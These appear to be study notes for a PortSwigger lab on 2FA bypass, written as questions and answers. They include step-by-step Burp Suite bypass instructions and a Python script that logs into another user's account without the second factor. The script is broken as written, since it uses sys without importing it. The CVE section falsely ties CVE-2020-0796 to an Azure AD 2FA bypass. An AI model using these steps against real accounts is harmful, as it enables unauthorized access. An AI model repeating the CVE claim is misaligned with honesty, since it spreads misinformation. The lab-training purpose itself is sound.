---
course: Web Security
topic: Authentication Vulnerabilities
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain why a two-factor authentication (2FA) system might be vulnerable to bypass attacks.**

A two-factor authentication (2FA) system might be vulnerable to bypass attacks due to implementation flaws or design weaknesses. For instance, if the application does not strictly enforce the 2FA check, an attacker could potentially skip the 2FA step entirely by manipulating network requests or exploiting logical errors in the software. In the lab described, the application failed to enforce the 2FA endpoint, allowing an attacker to log in using only the username and password. This type of vulnerability can be exploited even if the attacker does not possess the 2FA code.

**Q2. How would you exploit a 2FA bypass vulnerability similar to the one demonstrated in the lab?**

To exploit a 2FA bypass vulnerability, follow these steps:

1. Identify the login process and observe the network requests made during the login sequence.
2. Use a tool like Burp Suite to intercept and modify HTTP requests.
3. Attempt to log in with the victim’s credentials and intercept the request that should trigger the 2FA verification.
4. Drop the intercepted request to see if the application allows access without the 2FA code.
5. If the application does not enforce the 2FA step, you can gain unauthorized access to the account.

For example, in the lab, the attacker logs in with Carlos’ credentials and intercepts the request to the 2FA verification endpoint. By dropping this request, the attacker bypasses the 2FA requirement and gains access to the account.

**Q3. Write a Python script to automate the exploitation of a 2FA bypass vulnerability as shown in the lab.**

Here is a Python script that automates the exploitation of a 2FA bypass vulnerability:

```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def access_carlos_account(session, url):
    # Define the login URL and data
    login_url = f"{url}/login"
    login_data = {
        'username': 'carlos',
        'password': 'password'
    }

    # Perform the login request
    r = session.post(login_url, data=login_data, verify=False, proxies=proxies, allow_redirects=False)
    
    # Confirm bypass by checking the my account page
    my_account_url = f"{url}/my-account"
    r = session.get(my_account_url, verify=False, proxies=proxies)
    
    if 'Logout' in r.text:
        print("Successfully bypassed 2FA verification.")
    else:
        print("Exploit failed.")
        exit(1)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} http://www.example.com")
        exit(1)
    
    url = sys.argv[1]
    session = requests.Session()
    access_carlos_account(session, url)

if __name__ == "__main__":
    main()
```

This script uses the `requests` library to perform HTTP requests and includes logic to bypass the 2FA check by disabling redirections and confirming access to the account page.

**Q4. What recent real-world examples or CVEs demonstrate vulnerabilities related to 2FA bypasses?**

One notable example is the 2FA bypass vulnerability in Microsoft Azure Active Directory (AAD). In 2020, a researcher discovered a flaw (CVE-2020-0796) that allowed attackers to bypass 2FA by exploiting a misconfiguration in the AAD tenant settings. This flaw allowed unauthorized access to user accounts without requiring the 2FA code.

Another example is the 2FA bypass in some implementations of Google Authenticator, where a bug allowed attackers to reset the 2FA token and gain unauthorized access to accounts. This issue was identified and patched, but it highlights the importance of robust 2FA implementations.

These examples underscore the critical nature of ensuring that 2FA mechanisms are properly enforced and regularly audited to prevent such vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/13-Authentication Vulnerabilities/03-Lab 2 2FA simple bypass/05-Understanding the Lab Scenario|Understanding the Lab Scenario]] | [[Web Security (PortSwigger)/13-Authentication Vulnerabilities/03-Lab 2 2FA simple bypass/00-Overview|Overview]]
